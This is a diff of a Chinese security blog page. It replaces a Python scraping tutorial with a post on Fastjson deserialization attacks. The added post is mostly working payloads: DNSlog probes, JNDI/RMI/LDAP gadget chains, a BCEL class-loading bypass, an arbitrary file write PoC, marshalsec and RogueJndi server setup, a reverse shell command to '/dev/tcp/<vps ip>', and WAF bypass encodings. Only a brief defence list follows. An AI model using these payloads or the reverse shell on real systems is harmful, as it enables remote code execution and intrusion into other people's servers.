@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Python3爬虫知识梳理 · Ywc&#39;s blog</title>
+    <title>Fastjson漏洞攻击思路 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Python3爬虫知识梳理</a>
+                <a href="#" class="post-name">Fastjson漏洞攻击思路</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Python3爬虫知识梳理
+            Fastjson漏洞攻击思路
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "python">python</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞">漏洞</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">497</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">1.8k</span> / Reading time: <span class="post-count">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/12/15</span>
+                    <span class="post-intro-time">2020/07/21</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -399,51 +399,99 @@ height:50vh;
         <!-- TOC -->
 
 <ul>
-<li><a href="#0x01-%e5%b8%b8%e7%94%a8%e7%9a%84-python-%e5%ba%93">0X01 常用的 python 库</a></li>
+<li><a href="#fastjson反序列化漏洞原理">fastjson反序列化漏洞原理</a></li>
+<li><a href="#漏洞检测">漏洞检测</a></li>
+<li><a href="#攻击思路">攻击思路</a><ul>
+<li><a href="#1224">1.2.24</a></li>
+<li><a href="#1247">1.2.47</a></li>
+<li><a href="#1268">1.2.68</a></li>
+<li><a href="#不出网利用">不出网利用</a></li>
+<li><a href="#高版本jdk-jndi注入">高版本jdk JNDI注入</a></li>
+<li><a href="#fastjson-waf-绕过">Fastjson WAF 绕过</a></li>
+</ul>
+</li>
+<li><a href="#防御手段">防御手段</a></li>
+<li><a href="#reference">Reference</a></li>
 </ul>
 <!-- /TOC -->
-<h2 id="0X01-常用的-python-库"><a href="#0X01-常用的-python-库" class="headerlink" title="0X01 常用的 python 库"></a>0X01 常用的 python 库</h2><p><strong>1.urllib</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">urllib.request.urlopen(<span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure>
 
-<p><strong>2.re</strong></p>
-<p><strong>3.requests</strong></p>
-<p><strong>4.selenimu</strong></p>
-<p>这个库是配合一些驱动去爬取动态渲染网页的库</p>
-<p>(1)chromedriver</p>
-<p>我们使用的时候需要先下载一个<a href="http://npm.taobao.org/mirrors/chromedriver/2.46/" target="_blank" rel="noopener">chromedriver.exe</a> ，下载好了以后放在 chrome.exe 的相同目录下（默认安装路径），然后将这个目录放作为 PATH</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">driver.page_source</span><br></pre></td></tr></table></figure>
 
-<p>这种方式的唯一的缺点是会出现浏览器界面，这可能是我们不需要的,所以我们可以使用 headless 的方式来隐藏 web 界面(其实就是使用 options() 对象的 add_argument 属性去设置 headless 参数 )</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"http://www.baidu.com/"</span></span><br><span class="line"><span class="comment">#对应的chromedriver的放置目录</span></span><br><span class="line">driver = webdriver.Chrome(executable_path=(<span class="string">r'C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe'</span>), chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line">driver.get(base_url + <span class="string">"/"</span>)</span><br><span class="line"></span><br><span class="line">start_time=time.time()</span><br><span class="line">print(<span class="string">'this is start_time '</span>,start_time)</span><br><span class="line"></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(<span class="string">"selenium webdriver"</span>)</span><br><span class="line">driver.find_element_by_id(<span class="string">"su"</span>).click()</span><br><span class="line">driver.save_screenshot(<span class="string">'screen.png'</span>)</span><br><span class="line"></span><br><span class="line">driver.close()</span><br><span class="line"></span><br><span class="line">end_time=time.time()</span><br><span class="line">print(<span class="string">'this is end_time '</span>,end_time)</span><br></pre></td></tr></table></figure>
+<h2 id="fastjson反序列化漏洞原理"><a href="#fastjson反序列化漏洞原理" class="headerlink" title="fastjson反序列化漏洞原理"></a>fastjson反序列化漏洞原理</h2><p>1、开启autotype功能<br>2、当组件开启了autotype功能并且反序列化不可信数据时<br>3、Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法<br>4、若指定类的指定方法中有可被恶意利用的逻辑（Gadget）<br>5、不开启autotype可利用缓存机制进行绕过</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1.检测是否Fastjson</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;a&quot;:&quot;a\x] dos漏洞</span><br><span class="line">&#123;&quot;a&quot;:&quot;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;%s&quot;&#125;:&quot;x&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>(2)phantomJS</p>
-<p>这是另一种无界面的实现方法，虽然说不维护了，并且在使用的过程中会出现各种玄学，但是还是要介绍一下 和 Chromedriver 一样，我们首先要去下载<a href="http://phantomjs.org/download.html" target="_blank" rel="noopener">phantomJS</a>,然后将其放在 PATH 中方便我们后面的调用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.phantomJS()</span><br><span class="line">driver.get(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">driver.page_source</span><br></pre></td></tr></table></figure>
+<p>1.2.67版本前</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;fatu5k.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">1.2.67版本后payload</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>5.lxml</strong></p>
-<p>这个是为 XPATH 的使用准备的库</p>
-<p><strong>6.beautifulsoup</strong></p>
-<p>pip 安装的时候注意一下要安装 beautifulsoup4,表示第四个版本，并且这个库是依赖于 lxml 的，所以安装之前请先安装 lxml</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(<span class="string">'`&lt;html&gt;&lt;/html&gt;'</span>,<span class="string">'lxml'</span>)</span><br></pre></td></tr></table></figure>
+<p>2.精确检测版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;a&quot;:&quot;a\x]</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
 
-<p><strong>7.pyquery</strong></p>
-<p>和 BeautifulSoup 一样也是一个网页解析库，但是相对来讲语法简单一些（语法是模仿 jQuery 的）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">page = pq(<span class="string">'`&lt;html&gt;hello world&lt;/html&gt;`'</span>)</span><br><span class="line">result = page(<span class="string">'html'</span>).text()</span><br><span class="line">result</span><br></pre></td></tr></table></figure>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>1、基于jndi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>8.pymysql</strong></p>
-<p><strong>9.pymango</strong></p>
-<p><strong>10.redis</strong></p>
-<p><strong>11.flask</strong></p>
-<p><strong>12.django</strong></p>
-<p><strong>13.jupyter</strong></p>
+<p>2、<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code><br>(限制条件：解析JSON的时候需要使用Feature)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:sss&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;###EVIL_CODE###&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code><br>(限制条件：应用部署在Tomcat应用环境中 Tomcat 8.0以后使用org.apache.tomcat.dbcp.dbcp2.BasicDataSource Tomcat 8.0以下使用org.apache.tomcat.dbcp.dbcp.BasicDataSource )</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;###EVIL_CODE###&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;###EVIL_CODE###&quot;&#125;&#125;:&quot;ddd&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>1.2.25 以后autotype默认开启，所以41-45的一些Poc这里也不再列出， 我们直接跳到1.2.48以下不需要开启autotype下的Poc，其实1.2.47之前的Poc都可以改成绕过autotype格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;: true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>48以后68之前的Poc也需要目标开启autotype了，这里也跳过，直接看68的Poc，无须开启autype</p>
+<p>fastjson-1.2.68 任意文件写入poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;sun.rmi.server.MarshalOutputStream&quot;,&quot;out&quot;:&#123;&quot;@type&quot;:&quot;java.util.zip.InflaterOutputStream&quot;,&quot;out&quot;:&#123;&quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,&quot;file&quot;:&quot;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64&#x2F;jre&#x2F;lib&#x2F;charsets.jar&quot;,&quot;append&quot;:false&#125;,&quot;infl&quot;:&#123;&quot;input&quot;:&quot;xxx&quot;&#125;,&quot;bufLen&quot;:1048576&#125;,&quot;protocolVersion&quot;:1&#125;&#125;</span><br><span class="line">&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.nio.charset.Charset&quot;,&quot;val&quot;:&quot;500&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fastjson-1.2.68 jdbc反序列化poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;172.20.64.40&quot;,&quot;portToConnectTo&quot;:3306,&quot;url&quot;:&quot;jdbc:mysql:&#x2F;&#x2F;172.20.64.40:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;databaseToConnectTo&quot;:&quot;test&quot;,&quot;info&quot;:&#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;PORT&quot;:&quot;3306&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;user&quot;:&quot;yso_URLDNS_http:&#x2F;&#x2F;ahfladhjfd.6fehoy.dnslog.cn&quot;,&quot;PORT.1&quot;:&quot;3306&quot;,&quot;HOST.1&quot;:&quot;172.20.64.40&quot;,&quot;NUM_HOSTS&quot;:&quot;1&quot;,&quot;HOST&quot;:&quot;172.20.64.40&quot;,&quot;DBNAME&quot;:&quot;test&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;127.0.0.1&#x2F;#ExportObject 1099</span><br><span class="line"></span><br><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><p>参考：<a href="https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ</a> </p>
+<p>这里主要基本Poc使用1.2.24 无需出网Poc + 1.2.47嘚绕过autotype</p>
+<p>首先获取恶意class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, <span class="string">"calc"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取到class文件后，转化为BCEL格式(建议以上两步在低版本jdk下运行)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Path path = Paths.get(<span class="string">"D:\\java\\java_tools\\Calc.class"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">        System.out.println(bytes.length);</span><br><span class="line">        String result = Utility.encode(bytes,<span class="keyword">true</span>);</span><br><span class="line">        BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="string">"D:\\java\\java_tools\\bb.txt"</span>));</span><br><span class="line">        bw.write(<span class="string">"$$BCEL$$"</span> + result);</span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>基于&lt;=1.2.47版本的缓存类的绕过黑名单的方式修改原有poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"a"</span>: &#123;</span><br><span class="line">        <span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>: <span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>: &#123;</span><br><span class="line">        <span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>: <span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"c"</span>: &#123;</span><br><span class="line">        <span class="string">"@type"</span>: <span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>,</span><br><span class="line">        <span class="string">"driverClassLoader"</span>: &#123;</span><br><span class="line">            <span class="string">"@type"</span>: <span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"driverClassName"</span>: <span class="string">"###EVIL_CODE###"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="高版本jdk-JNDI注入"><a href="#高版本jdk-JNDI注入" class="headerlink" title="高版本jdk JNDI注入"></a>高版本jdk JNDI注入</h3><p>参考项目：<a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener">https://github.com/veracode-research/rogue-jndi</a><br>漏洞原理：<a href="https://paper.seebug.org/942/#ldapgadget" target="_blank" rel="noopener">https://paper.seebug.org/942/#ldapgadget</a></p>
+<p>1.填写好你的反弹命令</p>
+<p><code>sh -i &gt;&amp; /dev/tcp/你的vpsip/端口 0&gt;&amp;1</code></p>
+<p>2.runtime base64编码</p>
+<p>访问<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p>把第一步的命令粘进去，自动编码，复制下来把bash的关键字都改为sh</p>
+<p>3.使用RogueJndi-1.0开启ldap</p>
+<p>java -jar RogueJndi-1.0.jar -n “0.0.0.0” -c “写入第二步的命令”</p>
+<p>4.jndi地址为</p>
+<p>ldap://vpsip:1389/o=tomcat</p>
+<p>注：rogue-jndi 没法绕tomcat7</p>
+<h3 id="Fastjson-WAF-绕过"><a href="#Fastjson-WAF-绕过" class="headerlink" title="Fastjson WAF 绕过"></a>Fastjson WAF 绕过</h3><p>1、unicode编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;b&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;t00ls.5cd37009d59fc2c7fc55f2bee57cafab.dnslog.cn&#x2F;aaa&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、XCTF-校战“疫”中的ctf题目的一个payload：<code>\x74</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@\x74ype&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;- prefix&quot;:&quot;rmi:&#x2F;&#x2F;xxx.xxx&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、<code>\b</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:\b&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:9999&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4、<code>/**/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&#x2F;**&#x2F;&quot;Lcom.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;###RMI_LDAP_ADDRESS###&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>1、设置黑名单与白名单</p>
+<p>2、禁用autotype等关键词，可以在WAF上设置</p>
+<p>3、升级fastjson版本</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/QGyb1Zv4F9IvmjKfiCD_4Q" target="_blank" rel="noopener">Skay:Fastjson渗透测试指北</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2019/12/15/Python3%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">https://yinwc.github.io/2019/12/15/Python3%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2019/12/15/Python3%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">December 15th 2019, 4:35:56 pm</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2020/07/21/fastjsonlearn/">https://yinwc.github.io/2020/07/21/fastjsonlearn/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2020/07/21/fastjsonlearn/">July 21st 2020, 5:50:50 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -452,16 +500,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/12/31/WEB%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%B1%87%E6%80%BB/" title= WEB应用漏洞及修复 >
-                    <div class="nextTitle">WEB应用漏洞及修复</div>
+                <a href= "/2020/07/22/CSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title= CSRF漏洞挖掘 >
+                    <div class="nextTitle">CSRF漏洞挖掘</div>
                 </a>
             
         </li>
         <li class="previous">
             
